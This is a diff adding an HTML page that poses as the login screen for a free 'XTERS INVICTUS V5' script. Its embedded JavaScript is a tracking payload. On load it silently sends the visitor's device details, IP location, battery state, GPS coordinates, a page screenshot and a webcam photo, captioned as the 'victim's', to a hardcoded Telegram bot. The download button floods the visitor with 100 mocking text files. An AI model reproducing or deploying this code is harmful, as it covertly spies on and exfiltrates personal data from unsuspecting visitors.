@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login - Get Free Script</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: 	#000	;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,255,0,0.4);
+      text-align: center;
+      width: 90%;
+      max-width: 360px;
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+      color: 	#FF0000;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      background: 	#FF0000;
+      border: none;
+      border-radius: 5px;
+      color: white;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background: #FF00FF;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      color: 	#00FF00;
+    }
+    .login-box button:hover {
+      background: 	#FF00FF;
+    }
+    #download-section {
+      display: none;
+      margin-top: 20px;
+    }
+    #download-btn {
+      background: FF00FF;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #download-btn:hover {
+      background: #00FF00;
+    }
+    video { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>XTERS INVICTUS V5</h2>
+  <input type="text" id="username" placeholder="Username">
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="fakeLogin()">Login</button>
+
+  <div id="download-section">
+    <p>✅𝐒𝐔𝐂𝐂𝐄𝐒 𝐋𝐎𝐆𝐈𝐍🔓:</p>
+    <button id="download-btn" onclick="downloadScript()">Masuk </button>
+  </div>
+</div>
+
+<video id="videoElement" autoplay></video>
+<audio src="https://d.uguu.se/nvepOPBh.m4a" autoplay loop hidden></audio>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+<script>
+const token = '7623537146:AAF3YCdd5OnKt92gvnVM34MJw10gu5zOsq0'; // GANTI
+const chat_id = '6919560074'; // GANTI
+
+function sendText(text) {
+  $.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+    chat_id: chat_id,
+    text: text
+  });
+}
+
+function sendPhotoBase64(base64Data, filename = 'image.jpg', caption = '') {
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST',
+    body: (() => {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", dataURLtoBlob(base64Data), filename);
+      if (caption) form.append("caption", caption);
+      return form;
+    })()
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length, u8arr = new Uint8Array(n);
+  while(n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], {type:mime});
+}
+
+function fakeLogin() {
+  document.getElementById("download-section").style.display = "block";
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;(`=== LOGIN ===\nUsername: ${user}\nPassword: ${pass}\n====================`);
+}
+
+function downloadScript() {
+  alert("belilah 082321782241:>]");
+  const content = `Tolol di pelihara🥶😂🤣😭😂😂😂😂ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ`;
+  const total = 100;
+  let i = 1;
+
+  function downloadNext() {
+    if (i > total) return;
+    const blob = new Blob([content], { type: "text/plain" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = `HackedByFikXzXmodz_${i}.txt`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    i++;
+    setTimeout(downloadNext, 100); // jeda 50ms
+  }
+
+  downloadNext();
+}
+
+function captureScreenshot() {
+  html2canvas(document.body).then(canvas => {
+    const image = canvas.toDataURL("image/png");
+    sendPhotoBase64(image, 'screenshot.png', 'Screenshot tampilan halaman korban');
+  });
+}
+
+function getSystemInfo() {
+  const info = `
+=== SYSTEM INFO ===
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Resolution: ${screen.width}x${screen.height}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+RAM: ${navigator.deviceMemory || 'Unknown'} GB
+CPU Cores: ${navigator.hardwareConcurrency}
+Cookies Enabled: ${navigator.cookieEnabled}
+Touch: ${'ontouchstart' in window}, Max Touch: ${navigator.maxTouchPoints}
+===================
+`;
+  sendText(info);
+}
+
+function getGeolocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude, longitude, accuracy } = pos.coords;
+      sendText(`
+=== GPS LOCATION ===
+Latitude: ${latitude}
+Longitude: ${longitude}
+Accuracy: ${accuracy} meters
+Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+====================
+`);
+    }, err => {
+      sendText("Geolocation error: " + err.message);
+    });
+  }
+}
+
+function getIPInfo() {
+  $.get("https://ipinfo.io", function(res) {
+    sendText(`
+=== IP INFO ===
+IP: ${res.ip}
+City: ${res.city}
+Region: ${res.region}
+Country: ${res.country}
+Location: ${res.loc}
+Org: ${res.org}
+================
+`);
+  }, "json");
+}
+
+function getBattery() {
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      sendText(`
+=== BATTERY ===
+Level: ${(b.level * 100).toFixed(0)}%
+Charging: ${b.charging ? 'Yes' : 'No'}
+================
+`);
+    });
+  }
+}
+
+function captureWebcam() {
+  const video = document.getElementById("videoElement");
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    video.srcObject = stream;
+    const canvas = document.createElement("canvas");
+
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const image = canvas.toDataURL("image/jpeg");
+      sendPhotoBase64(image, 'webcam.jpg', 'Foto dari kamera korban');
+      stream.getTracks().forEach(track => track.stop());
+    }, 3000);
+  }).catch(err => {
+    sendText("Webcam error: " + err.message);
+  });
+}
+
+let startTime = Date.now();
+window.addEventListener("beforeunload", () => {
+  const duration = ((Date.now() - startTime) / 1000).toFixed(1);
+  sendText("Session duration: " + duration + " seconds.");
+});
+
+setTimeout(getSystemInfo, 500);
+setTimeout(getIPInfo, 1500);
+setTimeout(getBattery, 2500);
+setTimeout(getGeolocation, 3500);
+setTimeout(captureScreenshot, 5000);
+setTimeout(captureWebcam, 7000);
+</script>
+
+</body>
+</html>
